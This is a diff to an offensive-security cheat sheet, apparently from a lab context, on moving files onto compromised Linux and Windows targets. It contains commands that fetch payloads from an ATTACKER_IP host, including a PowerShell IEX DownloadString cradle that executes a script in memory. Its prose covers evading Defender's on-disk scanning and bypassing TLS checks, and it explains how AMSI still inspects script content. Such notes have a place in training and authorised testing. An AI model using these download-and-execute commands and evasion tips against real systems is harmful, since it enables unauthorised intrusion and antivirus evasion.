@@ -4,7 +4,7 @@ platform: any
 status: working
 fluency: guided
 source: lab
-updated: 2026-09-03
+updated: 2026-09-08
 ---
 
 # File Transfer
@@ -64,26 +64,26 @@ python3 -c 'import urllib.request as u; u.urlretrieve("http://ATTACKER_IP/f","/t
 - **Found** — `wget` prints a progress bar ending `saved [12345/12345]` with matching numbers; `curl -o` prints a bar reaching 100%. The `200` also appears in your server log.
 - **Empty** — a file that exists but is `0` bytes, or holds an HTML `<title>404 Not Found` page saved under your filename. The transfer "worked" and delivered nothing: check the path and that you are serving the directory you think you are.
 - **Error** — `Connection refused` from the target while the URL works in your own browser is almost always the port — you served on `8000` and the target's egress allows only `80`/`443`. `No route to host` is different: no path back to you at all, which means section 4. `wget: command not found` **and** `curl: command not found` sends you to the python line.
-- **Noise** — a [[Security-Terms#^tls|TLS]] warning (`certificate ... self-signed`) on an `https://` pull is not the failure; `wget --no-check-certificate` or `curl -k` past it. The download still happened.
+- **Noise** — a [[Security-Terms#^tls|TLS]] certificate complaint on an `https://` pull reads like a warning and is a refusal: `wget` stops and prints `To connect insecurely, use '--no-check-certificate'`, and no bytes arrive. Add that flag, or `curl -k`, and run it again. `curl` without `-o` is the other one — it prints the file to the terminal, so a binary fills the screen with garbage that looks like a crash and is a missing flag.
 
 **Then** — verified file goes to whatever you transferred it for. `Connection refused` or `No route` goes to section 4. `command not found` on every client goes to the same place.
 
 ## 3 — Pull onto a Windows target
 
-**Why now** — the target is Windows, so the Linux clients are gone and the right tool depends on whether you are standing in PowerShell or `cmd.exe`, and on whether Defender is watching the disk. Pick the in-memory route when you can, because a file that never touches disk is a file Defender never scans.
+**Why now** — the target is Windows, so the Linux clients are gone and the right tool depends on whether you are standing in PowerShell or `cmd.exe`, and on whether Defender is watching the disk. Pick the in-memory route when you can, because a file that never touches disk is a file the on-disk scanner never sees. It is not invisible: AMSI reads the script text as PowerShell runs it, so an in-memory pull dodges the file scan and not the content scan.
 
 ```powershell
 iwr http://ATTACKER_IP/winPEASx64.exe -outfile "$env:TEMP\wp.exe" -UseBasicParsing
 ```
 
-- `-UseBasicParsing` → on older PowerShell, `iwr` (`Invoke-WebRequest`) first spins up Internet Explorer's engine and, on a fresh profile with IE never launched, **hangs indefinitely**. This flag skips that. Omitting it produces a command that never returns, which looks like a network hang and is not.
+- `-UseBasicParsing` → on Windows PowerShell, `iwr` (`Invoke-WebRequest`) parses the response with Internet Explorer's engine, and on a profile where IE has never been launched it fails with `The response content cannot be parsed because the Internet Explorer engine is not available`. This flag skips that engine. The error names the browser, so it reads like a broken host rather than a missing flag. PowerShell 6 and later parse this way already.
 - write to `$env:TEMP` → a predictable writable path; a bare filename lands in the current directory, which may be `C:\Windows\System32` where you cannot write.
 
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/enum.ps1')
 ```
 
-- runs the script **in memory** — nothing is written, so on-disk antivirus never sees a file and there is nothing to clean up. This is the route to reach for when a downloaded `.exe` keeps disappearing.
+- runs the script **in memory** — nothing is written, so on-disk antivirus never sees a file and there is nothing to clean up. This is the route to reach for when a downloaded `.exe` keeps disappearing. AMSI still reads the script as it runs, so a block here is a content decision, not a file one, and repeating the same command changes nothing.
 
 From `cmd.exe`, where those are unavailable:
 
